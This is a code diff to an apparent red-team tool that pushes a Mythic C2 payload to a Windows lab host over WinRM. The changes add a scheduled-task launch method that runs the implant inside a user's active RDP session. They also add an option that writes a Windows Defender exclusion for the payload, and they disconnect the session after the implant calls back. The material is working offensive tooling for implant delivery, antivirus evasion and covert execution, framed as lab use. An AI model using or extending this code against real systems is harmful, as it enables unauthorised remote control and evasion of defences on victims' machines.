@@ -1,5 +1,10 @@
 #!/usr/bin/env python3
-"""Download a Mythic payload and launch it on a Ludus Windows host via WinRM."""
+"""Download a Mythic payload and launch it on a Ludus Windows host via WinRM.
+
+The GOAD clean-baseline foothold path uses an operator-owned interactive RDP
+session plus a scheduled task with LogonType Interactive. That keeps Apollo in
+the intended Samwell desktop session without relying on a RAM-backed snapshot.
+"""
 
 from __future__ import annotations
 
@@ -513,6 +518,13 @@ def timestamped_remote_name(filename: str) -> str:
     return f"{stem}_{time.strftime('%Y%m%d%H%M%S')}{suffix}"
 
 
+def default_remote_filename(filename: str, launch_method: str) -> str:
+    sanitized = sanitize_windows_filename(filename)
+    if launch_method == "scheduled-task-interactive":
+        return sanitized
+    return timestamped_remote_name(sanitized)
+
+
 def windows_join(directory: str, filename: str) -> str:
     return directory.rstrip("\\/") + "\\" + filename.lstrip("\\/")
 
@@ -644,6 +656,157 @@ $registered = Get-ScheduledTask -TaskName $taskName
     return parse_json_object(result["stdout"]) or result
 
 
+def find_active_interactive_session(output: str, run_as_user: str) -> dict[str, str] | None:
+    short_user = run_as_short_user(run_as_user).casefold()
+    if not short_user:
+        return None
+    for raw_line in str(output or "").splitlines():
+        line = raw_line.lstrip(">").strip()
+        if not line or line.casefold().startswith("username"):
+            continue
+        tokens = line.split()
+        if not tokens or tokens[0].casefold() != short_user:
+            continue
+        for index, token in enumerate(tokens[1:], start=1):
+            if token.casefold() != "active":
+                continue
+            session_id = tokens[index - 1] if index > 0 else ""
+            if session_id.isdigit():
+                return {"user": tokens[0], "session_id": session_id, "line": line}
+    return None
+
+
+def query_user_sessions(session: Any) -> dict[str, Any]:
+    result = run_ps(session, "quser 2>&1 | Out-String", check=False)
+    output = result.get("stdout") or result.get("stderr") or ""
+    return {"output": output, "status_code": result.get("status_code")}
+
+
+def wait_for_active_interactive_session(
+    session: Any,
+    run_as_user: str,
+    *,
+    timeout_seconds: int,
+    poll_interval: float,
+) -> dict[str, Any]:
+    deadline = time.monotonic() + max(0, timeout_seconds)
+    latest = {"output": "", "status_code": None}
+    while True:
+        latest = query_user_sessions(session)
+        match = find_active_interactive_session(latest.get("output", ""), run_as_user)
+        if match:
+            return {
+                "run_as_user": run_as_user,
+                "matched_user": match["user"],
+                "session_id": match["session_id"],
+                "session_line": match["line"],
+                "quser_output": latest["output"],
+            }
+        if time.monotonic() >= deadline:
+            raise DeployError(
+                f"No active interactive session found for {run_as_user!r} within {timeout_seconds}s. "
+                f"Open and keep an RDP session active before using scheduled-task-interactive. "
+                f"Last quser output: {latest.get('output')!r}"
+            )
+        time.sleep(max(0.25, poll_interval))
+
+
+def launch_scheduled_task_interactive(
+    session: Any,
+    remote_path: str,
+    run_as_user: str,
+    task_name: str | None,
+) -> dict[str, Any]:
+    task = task_name or f"SagePayloadInteractive_{time.strftime('%Y%m%d%H%M%S')}"
+    script = f"""
+$ErrorActionPreference = 'Stop'
+$taskName = {ps_quote(task)}
+$remotePath = {ps_quote(remote_path)}
+$runAsUser = {ps_quote(run_as_user)}
+$action = New-ScheduledTaskAction -Execute $remotePath
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+$principal = New-ScheduledTaskPrincipal -UserId $runAsUser -LogonType Interactive -RunLevel Limited
+$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
+Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null
+Start-ScheduledTask -TaskName $taskName
+Start-Sleep -Seconds 2
+$info = Get-ScheduledTaskInfo -TaskName $taskName
+$registered = Get-ScheduledTask -TaskName $taskName
+[PSCustomObject]@{{
+  Method = 'scheduled-task-interactive'
+  TaskName = $taskName
+  State = $registered.State.ToString()
+  LastTaskResult = $info.LastTaskResult
+  LastRunTime = $info.LastRunTime
+}} | ConvertTo-Json -Compress
+"""
+    result = run_ps(session, script)
+    return parse_json_object(result["stdout"]) or result
+
+
+def disconnect_interactive_session(session: Any, session_id: str) -> dict[str, Any]:
+    script = f"""
+$ErrorActionPreference = 'Stop'
+$sessionId = {ps_quote(str(session_id))}
+$before = quser 2>&1 | Out-String
+& "$env:SystemRoot\\System32\\tsdiscon.exe" $sessionId
+if ($LASTEXITCODE -ne 0) {{
+  throw "tsdiscon failed for session $sessionId with exit code $LASTEXITCODE"
+}}
+Start-Sleep -Seconds 1
+$after = quser 2>&1 | Out-String
+[PSCustomObject]@{{
+  Method = 'tsdiscon'
+  SessionId = $sessionId
+  Before = $before.Trim()
+  After = $after.Trim()
+}} | ConvertTo-Json -Compress
+"""
+    result = run_ps(session, script)
+    return parse_json_object(result["stdout"]) or result
+
+
+def maybe_disconnect_interactive_session(
+    session: Any,
+    args: argparse.Namespace,
+    launch: dict[str, Any],
+    new_callbacks: list[dict[str, Any]],
+) -> dict[str, Any] | None:
+    if args.launch_method != "scheduled-task-interactive" or not getattr(args, "disconnect_interactive_session", True):
+        return None
+    if not new_callbacks:
+        return {"skipped": True, "reason": "no-new-callback-observed"}
+    session_id = str((launch.get("interactive_session") or {}).get("session_id") or "").strip()
+    if not session_id:
+        raise DeployError("Interactive launch did not report a session ID for post-callback disconnect.")
+    return disconnect_interactive_session(session, session_id)
+
+
+def ensure_defender_exclusion(session: Any, remote_path: str) -> dict[str, Any]:
+    script = f"""
+$ErrorActionPreference = 'Stop'
+$path = {ps_quote(remote_path)}
+$before = @((Get-MpPreference).ExclusionPath | Where-Object {{ $_ }})
+$alreadyPresent = $before -contains $path
+if (-not $alreadyPresent) {{
+  Add-MpPreference -ExclusionPath $path
+}}
+$after = @((Get-MpPreference).ExclusionPath | Where-Object {{ $_ }})
+[PSCustomObject]@{{
+  Method = 'defender-exclusion-path'
+  Path = $path
+  AlreadyPresent = $alreadyPresent
+  PresentAfter = ($after -contains $path)
+  ExclusionPath = $after
+}} | ConvertTo-Json -Compress
+"""
+    result = run_ps(session, script)
+    parsed = parse_json_object(result["stdout"]) or result
+    if not parsed.get("PresentAfter"):
+        raise DeployError(f"Defender exclusion was not present after Add-MpPreference for {remote_path!r}.")
+    return parsed
+
+
 def run_as_short_user(run_as_user: str) -> str:
     user = str(run_as_user or "").strip()
     if "\\" in user:
@@ -761,6 +924,16 @@ def launch_payload(session: Any, remote_path: str, args: argparse.Namespace) -> 
         )
     if method == "scheduled-task-s4u":
         return launch_scheduled_task_s4u(session, remote_path, args.run_as_user, args.task_name)
+    if method == "scheduled-task-interactive":
+        session_info = wait_for_active_interactive_session(
+            session,
+            args.run_as_user,
+            timeout_seconds=args.wait_interactive_session_seconds,
+            poll_interval=args.poll_interval,
+        )
+        result = launch_scheduled_task_interactive(session, remote_path, args.run_as_user, args.task_name)
+        result["interactive_session"] = session_info
+        return result
     if not password:
         if method == "auto" and args.allow_s4u_task:
             result = launch_scheduled_task_s4u(session, remote_path, args.run_as_user, args.task_name)
@@ -769,7 +942,7 @@ def launch_payload(session: Any, remote_path: str, args: argparse.Namespace) -> 
             return result
         raise DeployError(
             f"--run-as-user requires --run-as-password, environment variable {args.run_as_password_env}, "
-            "--launch-method scheduled-task-s4u, or --allow-s4u-task."
+            "--launch-method scheduled-task-s4u, --launch-method scheduled-task-interactive, or --allow-s4u-task."
         )
 
     if method == "start-process":
@@ -876,7 +1049,11 @@ async def command_deploy(args: argparse.Namespace) -> None:
     run_as_hash_source = None
     if (
         args.run_as_user
-        and args.launch_method not in {"rubeus-asktgt-netonly", "scheduled-task-s4u"}
+        and args.launch_method not in {
+            "rubeus-asktgt-netonly",
+            "scheduled-task-s4u",
+            "scheduled-task-interactive",
+        }
         and not resolve_run_as_password(args)
         and args.run_as_credential_account
     ):
@@ -931,11 +1108,14 @@ async def command_deploy(args: argparse.Namespace) -> None:
         log_phase("winrm-session-start")
         session = winrm_session(host, args.winrm_operation_timeout_seconds, args.winrm_read_timeout_seconds)
         log_phase("winrm-session-ok")
-        filename = (
-            args.remote_filename
-            or timestamped_remote_name(Path(args.payload_url).name if args.payload_url else local_path.name)
-        )
+        source_filename = Path(args.payload_url).name if args.payload_url else local_path.name
+        filename = args.remote_filename or default_remote_filename(source_filename, args.launch_method)
         remote_path = args.remote_path or windows_join(args.remote_dir, filename)
+        defender_exclusion = None
+        if args.add_defender_exclusion:
+            log_phase("defender-exclusion-start", remote_path=remote_path)
+            defender_exclusion = ensure_defender_exclusion(session, remote_path)
+            log_phase("defender-exclusion-ok", remote_path=remote_path)
         log_phase("transfer-start", remote_path=remote_path, timeout_seconds=args.transfer_timeout_seconds)
         transfer = transfer_payload(session, payload_url, remote_path, args.transfer_timeout_seconds)
         log_phase("transfer-ok", remote_path=remote_path)
@@ -961,6 +1141,18 @@ async def command_deploy(args: argparse.Namespace) -> None:
             args.poll_interval,
         )
         log_phase("callback-wait-done", new_callbacks=len(new_callbacks))
+        interactive_session_disconnect = maybe_disconnect_interactive_session(
+            session,
+            args,
+            launch,
+            new_callbacks,
+        )
+        if interactive_session_disconnect:
+            log_phase(
+                "interactive-session-disconnect-done",
+                skipped=bool(interactive_session_disconnect.get("skipped")),
+                session_id=interactive_session_disconnect.get("SessionId"),
+            )
         result = {
             "payload": payload_summary(payload) if payload else None,
             "download": download,
@@ -975,6 +1167,8 @@ async def command_deploy(args: argparse.Namespace) -> None:
             },
             "transfer": transfer,
             "launch": launch,
+            "defender_exclusion": defender_exclusion,
+            "interactive_session_disconnect": interactive_session_disconnect,
             "new_callbacks": [callback_identity(row) for row in new_callbacks],
             "callbacks_after": [callback_identity(row) for row in callbacks_after],
         }
@@ -1047,11 +1241,20 @@ def build_parser() -> argparse.ArgumentParser:
             "start-process",
             "scheduled-task",
             "scheduled-task-s4u",
+            "scheduled-task-interactive",
             "rubeus-asktgt-netonly",
         ],
         default="auto",
     )
     deploy_parser.add_argument("--allow-s4u-task", action="store_true")
+    deploy_parser.add_argument(
+        "--add-defender-exclusion",
+        action="store_true",
+        help=(
+            "Before transfer, add a narrow Defender ExclusionPath for the staged payload file. "
+            "Use only for operator-owned foothold bootstrap on the lab range."
+        ),
+    )
     deploy_parser.add_argument("--run-as-hash-credential-types", default="hash,ntlm,rc4")
     deploy_parser.add_argument("--run-as-domain", default=None)
     deploy_parser.add_argument("--run-as-dc", default=None)
@@ -1059,6 +1262,21 @@ def build_parser() -> argparse.ArgumentParser:
     deploy_parser.add_argument("--rubeus-timeout-seconds", type=int, default=25)
     deploy_parser.add_argument("--task-name", default=None)
     deploy_parser.add_argument("--wait-callbacks-seconds", type=int, default=20)
+    deploy_parser.add_argument(
+        "--wait-interactive-session-seconds",
+        type=int,
+        default=120,
+        help="Seconds to wait for an active RDP/interactive session for --launch-method scheduled-task-interactive.",
+    )
+    deploy_parser.add_argument(
+        "--disconnect-interactive-session",
+        action=argparse.BooleanOptionalAction,
+        default=True,
+        help=(
+            "After a new callback is observed for --launch-method scheduled-task-interactive, disconnect the "
+            "RDP session with tsdiscon so the local client exits without logging off the Windows session."
+        ),
+    )
     deploy_parser.add_argument("--poll-interval", type=float, default=3.0)
     deploy_parser.add_argument("--transfer-timeout-seconds", type=int, default=45)
     deploy_parser.add_argument("--winrm-operation-timeout-seconds", type=int, default=45)
